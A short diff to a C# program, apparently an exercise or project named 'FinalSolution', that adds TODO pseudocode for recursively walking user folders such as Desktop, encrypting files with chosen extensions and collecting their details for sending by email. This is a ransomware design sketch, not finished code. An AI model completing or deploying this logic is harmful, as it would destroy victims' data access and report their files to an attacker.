@@ -21,6 +21,14 @@ namespace FinalSolution
 
         static void Main(string[] args)
         {
+            // TODO: You should hold list of strings, each one represents a root path (directory).
+            // Then, write a function encryptDirRecursive(path), that have the following pseudocode:
+            // for each file f in path:
+            //      if f has interesting extension:
+            //          encrypt(f)
+            //          save f details in a global string, for email sending
+            // for each directory d in path:
+            //      encryptDirRecursive(d)
             var specialFolders = new List<Environment.SpecialFolder>()
             {
                 Environment.SpecialFolder.Desktop,
